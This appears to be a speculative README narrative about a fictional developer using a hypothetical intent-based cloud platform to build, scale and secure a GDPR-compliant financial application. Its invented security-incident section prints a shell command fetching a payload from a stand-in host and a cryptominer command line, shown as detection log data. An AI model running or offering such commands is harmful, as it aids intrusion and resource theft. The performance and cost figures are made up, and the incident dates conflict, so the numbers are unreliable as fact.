# Joe's Journey: Building and Running Application using Intent-Based Cloud

This repo documents the hypothetical journey of a small development team adopting an intent-based cloud platform for building and operating a financial application in Europe. It showcases how declaring intent rather than implementation details can realistically simplify application lifecycle management while improving operations, security, compliance, and sustainability.

Working name for this hypothetical cloud is the **Habitat** - a sustainable place apps can live.

## Table of Contents

- [Month 1: Project Initialization](#month-1-project-initialization)
- [Month 2: Traffic Spike Handling](#month-2-traffic-spike-handling)
- [Month 5: Regional Network Outage](#month-5-regional-network-outage)
- [Month 7: Compliance Evolution](#month-7-compliance-evolution)
- [Month 11: Security Incident Response](#month-11-security-incident-response)
- [Month 12: Advanced Observability](#month-12-advanced-observability)
- [Month 12: End Of Year](#month-12-end-of-year)
- [New Developer Experience](#new-developer-experience)

## Month 1: Project Initialization

### Morning: Project Setup

Joe, a senior developer, arrives at work with a new assignment: build and deploy a typical 3-tier financial application that processes EU citizens' data and must comply with GDPR. Instead of assembling a team of infrastructure specialists, security experts, and compliance officers, Joe simply opens the Intent-Based Cloud portal.

"Good morning, Joe," greets the platform dashboard. "Ready to start a new project?"

Joe creates a new application called "EuroFinance" and begins by defining the high-level intent:

```javascript
const euroFinance = new Application('eurofinance')
  .withDescription('Financial management platform for EU customers')
  .withCompliance({
    frameworks: ['GDPR', 'PSD2'],
    dataSovereignty: ['EU'],
    dataClassification: 'financial-PII',
  })
  .withAvailability('99.99%')
  .withBudget('€15,000/month');
```

**Behind the scenes:** The platform's AI analyzes these requirements, mapping compliance frameworks to technical controls, identifying available EU-only regions, and calculating resource needs for the stated availability level.

### Afternoon: Component Definition

Joe defines the three tiers of his application:

```javascript
// Web frontend
const frontend = euroFinance.component('frontend')
  .withIntent({
    type: 'web-ui',
    userExperience: {
      targetLoadTime: '1.2s',
      globalReach: true, // EU users still may travel
      accessibility: 'WCAG-AA'
    }
  });

// Application logic
const appServer = euroFinance.component('app-server')
  .withIntent({
    type: 'business-logic',
    dataProcessing: {
      personalData: true,
      dataResidency: 'EU-strict'
    }
  });

// Database tier
const database = euroFinance.component('database')
  .withIntent({
    type: 'financial-data-store',
    encryption: 'at-rest-and-in-transit',
    compliance: {
      dataRetention: '7-years',
      rightToErasure: true
    }
  });

// Define relationships
frontend.dependsOn(appServer);
appServer.dependsOn(database);
```

Joe doesn't specify instance types, availability zones, load balancers, or encryption keys — just what the components need to do.

**Behind the scenes:** The platform evaluates architecture options (ARM64 for efficiency), regional deployments (EU regions with lowest carbon intensity), compliance requirements (translating GDPR into specific controls, same for NIS2 and others), and security posture (determining encryption standards, network segmentation). Metrics and composite alarms are automatically generated based on the application context.

## Deployment Day

### Morning: Review and Deploy

Joe arrives to see the platform has generated a recommended implementation plan:

```
RECOMMENDATION READY: EuroFinance Application
• Compliance: 100% GDPR controls mapped
• Architecture: ARM64 (frontend, app-server), x86_64 (database)
• Regions: Primary: EU-North (Stockholm), DR: EU-Central (Frankfurt)
• Estimated footprint: 73% lower carbon than baseline
• Estimated cost: €12,400/month (€2,600 under budget)
```

The plan includes data residency controls, automated right-to-erasure workflows, EU-specific data protection logs, and multi-region disaster recovery. With a single click, Joe approves the deployment.

**Behind the scenes:** The platform provisions recommended ARM64 instances because there are no limitations or specific microcode optimizations in the code and libraries itself. It sets up database encryption and backup schedules, configures network security, deploys application code, establishes GDPR-specific compliance dashboards, and creates synthetic users for testing.

### Afternoon: Go-Live

After final testing and stakeholder approval, the application goes live:

```
DEPLOYMENT SUCCESSFUL: EuroFinance Application
• All compliance tests passing
• Performance metrics within targets
• No security vulnerabilities detected
• Carbon efficiency: 76% better than industry benchmark
```

**Comparison with traditional cloud:** In traditional public cloud, this same process would typically require 2 infrastructure engineers spending a week designing the architecture, 1 security specialist, 1 compliance expert, multiple review meetings, and days of troubleshooting configuration issues and deciding on the landing zone and type of compute to pick.

## Month 2: Traffic Spike Handling

### Monday, 9:15 AM: Sudden Traffic Surge

Joe receives a notification: "EuroFinance experiencing 500% increase in traffic due to mention in Bloomberg financial news."

In a traditional IT environment, this could trigger panic. Instead, Joe observes the platform's response:

```
ADAPTIVE RESPONSE ACTIVE: Traffic surge detected
• Frontend: Scaling from 12 to 50 instances across 3 EU regions
• App-Server: Scaling from 8 to 30 instances, prioritizing ARM64 for efficiency
• Database: Read replicas increased from 3 to 6
• Current performance: Page load 1.8s (target: 1.2s) - improving trend
• Estimated stabilization: 9 minutes
```

The platform has automatically expanded CDN capacity, prioritized critical transaction paths, temporarily increased cache TTLs for non-personal data, and adjusted database query patterns for read-heavy traffic.

**Behind the scenes:** The platfom advisor AI has analyzed the traffic pattern to determine legitimacy, predicted duration based on news cycle patterns, calculated optimal scaling while minimizing cost, selected carbon-efficient regions meeting latency requirements, and pre-warmed additional capacity.

### Monday, 10:30 AM: Stabilization

```
ADAPTATION COMPLETE: System stable under elevated load
• Current capacity: 410% of baseline
• Performance metrics: All within target
• Cost impact: €142/day additional spend (within budget reserves)
• Sustainability impact: Carbon efficiency maintained through architectural selection
• Recommendation: Monitor for 24h before adjusting capacity plan
```

**Comparison with traditional cloud:** In traditional public cloud, the same traffic spike might require on-call engineers manually increasing Auto Scaling Group limits, database administrators adjusting parameters, a war room coordinating changes across teams, potential service degradation during manual intervention, and post-incident concerns about overprovisioning costs.

## Month 5: Regional Network Outage

### Wednesday, 3:20 PM: Incident Begins

Joe gets an alert: "Network degradation detected in EU-North region."

```
RESILIENCE EVENT ACTIVE: Network degradation in EU-North
• Impact: 40% packet loss affecting Stockholm datacenters
• Automatic response: Isolating affected region, traffic redirecting to EU-Central
• Application status: Available (performance at 92% of target)
• Customer impact: Medium (97 sessions transferred)
• Estimated financial impact: None
```

The platform has detected network degradation before it became a complete outage, shifted traffic away from the affected region, prioritized database replication to ensure data consistency, and adjusted caching strategies to reduce origin requests.

**Behind the scenes:** The platform's network analyzers detected increasing latency and packet loss, predicted potential regional degradation, preemptively warmed up capacity in alternative regions, shifted workloads to x86_64 instances where ARM pool was exhausted, ensured replication was current before traffic redirection, and prioritized compliance-critical functions during transition.

### Wednesday, 4:45 PM: Resolution

```
RESILIENCE EVENT RESOLVED: Network restored in EU-North
• Automatic recovery beginning
• Traffic gradually returning to normal distribution
• Performance metrics: 100% of targets
• Data consistency: Verified
• Compliance status: Maintained throughout incident
```

**Comparison with traditional cloud:** In traditional public clouds, the same outage might result in scrambling to manually fail over, potential data consistency issues, engineers working overtime to reconfigure resources, customer complaints about unavailability, and lengthy post-mortems.

## Month 7: Compliance Evolution

### New GDPR Interpretation

Joe receives a platform notification: "EU regulatory update detected: New guidance on consent management."

The platform has analyzed the regulatory change using the built in compliance manager, identified components needing modification, and generated a compliance adaptation plan:

```
COMPLIANCE UPDATE RECOMMENDED:
• Consent management workflow requires additional explicit opt-in step
• Data retention policies need adjustment for 'derived insights'
• Cookie management requires additional regional variations

Estimated implementation: 
• 2 developer days for frontend consent changes
• 0 days for backend changes (automated adaptation)
• Testing and verification: 1 day
```

Joe approves the changes, and the platform updates data retention policies automatically, provides code snippets for frontend changes, schedules compliance verification, and documents all changes for audit purposes.

**Comparison with traditional cloud:** In traditional public cloud, this would typically require legal team reviews, compliance specialists determining requirements, infrastructure engineers updating configurations, manual testing, and preparing updated audit documentation.

## Month 11: Security Incident Response

### Tuesday, 2:47 AM: Initial Detection

While Joe sleeps, the platform detects unusual activity in the EuroFinance application – a container in the app-server tier consuming abnormally high CPU with unusual process patterns.

**Behind the scenes:** The platform's integrated observability has collected rich telemetry from every component:

```json
{
  "eventType": "process_execution",
  "timestamp": "2025-10-17T02:46:23.142Z",
  "resourceId": "app-server-pod-e892c",
  "architecture": "arm64",
  "region": "eu-north-3",
  "application": "eurofinance",
  "component": "app-server",
  "environment": "production",
  "userContext": "api-service-account",
  "complianceContext": {
    "dataResidency": "EU",
    "piiAccess": true,
    "gdprRelevant": true
  },
  "securityContext": {
    "privilegeLevel": "standard",
    "securityBoundary": "container-isolated",
    "sensitivityLevel": "restricted"
  },
  "processDetails": {
    "name": "xmrig",
    "commandLine": "./xmrig -o crypto.pool.hidden.onion -u wallet345112",
    "parentProcess": "bash",
    "networkConnections": ["crypto.pool.hidden.onion:3333"]
  }
}
```

The platform instantly correlated this with threat indicators, normal behavior baselines, and the component's intended purpose, while tracing the execution path to identify the entry point.

### Tuesday, 2:50 AM: Automated Response

The platform isolates the affected container, preserves evidence, deploys a clean instance, routes requests to unaffected instances, and increases monitoring sensitivity. Platform sends Joe a message to his phone notifying about what is happening.

The security event timeline with rich contextual metadata shows:

```
02:46:12 - [API-GATEWAY] - Unusual POST request to /api/document/process 
           {source_ip: "185.224.x.x", user_agent: "Custom/2.1", 
           request_size: 12.4MB, authentication: "api-key-7623"}

02:46:14 - [APP-SERVER] - Document processing initiated
           {document_type: "pdf", user_context: "api-service-account", 
           file_hash: "e5f2c47ab21e4c...", access_level: "standard"}

02:46:17 - [APP-SERVER] - Document parser exception
           {error_type: "buffer_overflow", component: "pdf_renderer", 
           stack_trace: "included", memory_impact: "heap_corruption"}

02:46:18 - [APP-SERVER] - Unexpected shell execution
           {process: "bash", triggered_by: "pdf_renderer", 
           user_context: "app-service", command: "wget hidden.dropserver.io/payload.sh"}

02:46:21 - [APP-SERVER] - File download completed
           {file: "payload.sh", size: 4.2KB, hash: "a82efc937..."}

02:46:23 - [APP-SERVER] - Crypto miner launched
           {process: "xmrig", arguments: "-o crypto.pool.hidden.onion -u wallet345112", 
           cpu_usage: 98%, network: "tor_connection_attempt"}
```

### Tuesday, 6:30 AM: Joe's Early Morning

Joe arrives at work and sees a security incident notification:

```
SECURITY INCIDENT CONTAINED - ZERO-DAY VULNERABILITY
• Attack vector: PDF parser buffer overflow in document processing API
• Impact: Attempted cryptocurrency mining on 2 containers
• Status: Contained and remediated
• Customer data: No exposure detected (verified via access tracing)
• Current application status: Fully operational with protective measures
```

The incident report contains:

**Vulnerability Analysis:**
```
Component: document-processing-service v3.4.2
Issue: Buffer overflow in PDF parser when handling embedded JavaScript
Exploitation: Remote code execution via crafted PDF
Affected instances: 2 containers (8% of fleet)
CVE status: Previously unknown, CVE request automated (pending assignment)
```

**Attack Chain Visualization:** An interactive diagram showing the exploit timeline progression from initial request to cryptominer execution.

**Automated Mitigations Applied:**
```
1. Temporary input filtering rule added to API gateway (deployed 02:51 AM)
2. Vulnerable component isolated behind enhanced validation (deployed 02:52 AM)
3. Runtime application self-protection rules updated (deployed 02:55 AM)
4. Container security policies tightened (deployed 02:57 AM)
```

**Recommended Actions:**
```
1. Deploy permanent patch to document processing service (ready for review)
2. Review and approve updated API input validation rules (ready for review)
3. Approve NIS2/CRA incident report for regulatory submission (draft generated)
```

### Tuesday, 10:15 AM: Incident Response

Joe reviews the automatically generated patch, which addresses the buffer overflow vulnerability, and then examines the regulatory report compliant with EU's NIS2 Directive and CRA that needs to be submited to the government agency:

```
REGULATORY INCIDENT REPORT - NIS2/CRA COMPLIANCE
Entity: EuroFinance Solutions GmbH
Incident Classification: Attempted system compromise (contained)
Initial Detection: 2023-10-17 02:47:23 UTC
Containment Time: 2023-10-17 02:49:01 UTC (98 seconds)
Resolution Time: 2023-10-17 09:32:17 UTC (est. upon patch approval)

Incident Details:
- Attack vector: Previously unknown vulnerability in PDF processing library
- Initial access: Via authenticated API endpoint using valid credentials
- Exploitation: Buffer overflow leading to arbitrary code execution
- Purpose: Cryptocurrency mining (no data exfiltration detected)

Affected Systems:
- 2 application containers (8% of fleet)
- No PII/customer data accessed (verified through access logs and data plane tracing)

Mitigation Actions:
- Vulnerable components isolated and replaced
- Temporary filtering rules implemented
- Permanent patch developed and ready for deployment
- Enhanced monitoring implemented across all systems

Supporting Evidence:
- Full request traces with metadata (attached)
- Process execution timeline (attached)
- Network flow logs (attached)
- Container forensic analysis (attached)
```

This detailed reporting is possible through the platform's embedded metadata approach:

1. **Unified Metadata Schema** across logs, metrics, and traces
2. **Automatic Instrumentation** of all network communications, processes, API calls, and database queries
3. **Correlation Engine** maintaining causal relationships between actions

### Tuesday, 11:30 AM: Root Cause Analysis

Joe's security team reviews the root cause analysis:

```
ROOT CAUSE ANALYSIS: Document Processing Vulnerability

Primary Cause:
- Buffer overflow in PDF parser when processing embedded JavaScript objects
- Vulnerability exists in open-source library pdf-processor v2.3.1
- Bug introduced in commit e721f93a by developer "smit-contributor" on 2025-09-14

Contributing Factors:
1. Library accepted with minimal review (automated static analysis only)
2. Dynamic code execution in document processor not blocked by policy
3. Container escape detection had 1.2s latency from detection to isolation

Defense Effectiveness:
[OK] Attack contained to initial compromise point
[OK] No lateral movement achieved
[OK] No data access beyond original authorization
[OK] No service disruption to customers
[OK] Full attack chain captured for analysis
[FAIL] Initial exploit not prevented (zero-day)
```

The platform presents system adaptations from the incident:

```
SYSTEM ADAPTATIONS FROM INCIDENT:

1. Code Review Policies Updated:
   - Enhanced scrutiny for document processing components
   - Automated memory safety verification added to CI/CD

2. Runtime Protections Enhanced:
   - Process execution patterns baseline refined
   - Network connection monitoring sensitivity increased by 35%
   - Unexpected process spawn detection latency reduced to 235ms

3. Supply Chain Security:
   - New contributor analysis for dependencies implemented
   - Additional dynamic testing for document handling components

4. Knowledge Sharing:
   - Vulnerability details safely shared with security community
   - Detection signatures distributed to partner security platforms
```

**Comparison with traditional cloud:** In traditional public cloud, this incident might have gone undetected for hours or days if was weekend until resource usage triggered billing alerts. Security engineers would manually hunt for logs across various systems, reconstructing the attack chain through lenghty correlation, involving multiple teams for mitigation, spending days gathering evidence for regulatory reporting, and conducting root cause analysis with limited information.

## Month 12: Advanced Observability

### The Security Review Meeting

One month after the incident, Joe demonstrates the platform's integrated observability to the CISO.

#### 1. Contextual Metadata Visualization

Joe shows a request flowing through the system with automatically added metadata:

```
REQUEST TRACING WITH ENHANCED METADATA:

→ [API Gateway]
   Added context: {auth_context: "oauth2", user_id: "redacted", user_role: "finance_manager",
                  geo_location: "Milan, IT", device_type: "iOS mobile", access_rights: "tier_2"}
   
   → [Authentication Service]
      Added context: {identity_verified: true, mfa_status: "verified", 
                     last_auth: "37m ago", risk_score: "low"}
      
      → [App Server]
         Added context: {business_function: "portfolio_analysis", data_sensitivity: "high", 
                       compliance_frameworks: ["GDPR", "PSD2"], data_residency: "EU-North"}
         
         → [Database]
            Added context: {query_type: "read", tables_accessed: ["accounts", "transactions"],
                          row_count: 843, pii_accessed: true, encryption_applied: true}
```

#### 2. Security-Specific Metadata

```json
{
  "request_id": "a82c1f43-9e1d",
  "timestamp": "2023-11-14T14:22:17.232Z",
  "operation": "data_export",
  "security_context": {
    "authentication": {
      "method": "oauth2",
      "principal_id": "user:maria.smitka",
      "authorization_time": "2023-11-14T13:58:23Z",
      "verification_factors": ["password", "mobile_push"],
      "session_anomaly_score": 0.03
    },
    "authorization": {
      "permissions": ["data:read", "export:create"],
      "policy_evaluated": "data-export-policy-v3",
      "restrictions": ["no-full-account-numbers", "eu-only-storage"],
      "justification_required": false
    },
    "data_protection": {
      "classification_level": "restricted",
      "encryption_applied": "AES-256-GCM",
      "tokenization_applied": ["account_numbers", "personal_identifiers"],
      "dlp_scan_result": "passed"
    },
    "contextual_risk": {
      "time_of_day_typical": true,
      "location_typical": true,
      "data_volume_typical": true,
      "overall_risk_score": 0.12
    }
  }
}
```

#### 3. Automated Compliance Reporting

Joe demonstrates how rich metadata enables instant generation of GDPR access reports, PSD2 compliance verification, or NIS2 incident documentation without manual data gathering. CISO is happy.

#### 4. Anomaly Detection with Context

Joe shows how contextual metadata enables sophisticated anomaly detection:

```
NORMAL ACCESS PATTERN:
User accesses 250 customer records over 4 hours during business hours from corporate office
Context: {user_role: "customer_service", business_function: "support_tickets", 
         typical_access_pattern: true, access_velocity: "normal"}

ANOMALOUS ACCESS PATTERN:
User accesses 250 customer records in 3 minutes at 2 AM from unknown location
Context: {user_role: "customer_service", business_function: "unknown", 
         typical_access_pattern: false, access_velocity: "extreme", 
         time_anomaly: true, location_anomaly: true}
```

#### Comparative Analysis

| Aspect | Traditional Cloud | Intent-Based Cloud |
|--------|------------------------|---------------------------|
| **Instrumentation** | Manual per-service setup | Automatic and comprehensive |
| **Metadata** | Inconsistent across services | Uniform schema with rich context |
| **Correlation** | Manual, often post-incident | Automatic, real-time |
| **Coverage** | Limited to configured services | Complete application lifecycle |
| **Regulatory Reporting** | Manual evidence gathering | Automated with full context |
| **Intelligence** | Basic threshold alerting | Contextual anomaly detection |
| **Response Time** | Hours to days | Seconds to minutes |
| **Security Team Size** | 5 specialists | 1 security architect |

"What used to require a dedicated security operations team now happens automatically," Joe explains. "Because the platform understands what our application is trying to accomplish—through its intent-based model, it can distinguish between legitimate operations and suspicious ones much more effectively." CISO becomes even happier. 

## Month 12: End Of Year

### Annual Review Meeting

Joe presents the application's first-year performance summary to stakeholders:

```
EUROFINANCE: YEAR ONE PERFORMANCE
• Uptime: 99.996% (exceeding 99.99% target)
• Performance: All targets consistently met
• Cost efficiency: 16% under budget (€39,600 saved)
• Carbon efficiency: 61% below industry benchmark
• Automated optimizations: 347
• Developer operational interventions required: 14
• Compliance status: 100% conformant through 4 regulatory updates
```

The platform has continually evolved the application, shifting 83% of compute to ARM64 as compatibility improved, optimizing database queries to reduce CPU needs by 34%, implementing critical security patches without developer intervention, and adapting to regional latency changes by rebalancing traffic and CDN access.

Joe's team has focused almost entirely on business features rather than infrastructure management, delivering more functionality than planned while using 40% less staff than their peers on similar projects.

**Comparison with traditional cloud:** In traditional public cloud, maintaining similar results would typically require 2-3 dedicated DevOps engineers, regular infrastructure reviews, manual performance optimization, dedicated security monitoring, and compliance specialists. In many cases dedicated enterprise support from the cloud provider needs to be engaged increasing cost of operations. 

## New Developer Experience

This hypothetical intent-based platform hasn't just reduced work, it has fundamentally changed its nature. Instead of infrastructure design, capacity planning, monitoring and alert management, and security configuration, Joe's team focuses on developing business features, improving user experience, analyzing business metrics, and planning new functionality.

What would have required 8-10 specialized individuals in a traditional cloud environment team has been accomplished by a smaller team of 3 developers, with the platform handling complexity that would normally demand specialized expertise, trainings, certifications and experience.

The true power of intent-based computing is that the system understands not just what it's doing, but why it's doing it and what the application context looks like — enabling intelligent decisions across the entire application lifecycle, from deployment to security to optimization.

---

## Bootom Line

This document is my vision for intent-based cloud computing. While aspects of this approach are emerging in various platforms today, the integration described here represents a direction cloud computing could evolve toward. When product developers and marketers design something today, they model the end-user journey first, why can't we do the same with public cloud? Do we even know who our real end-user is?
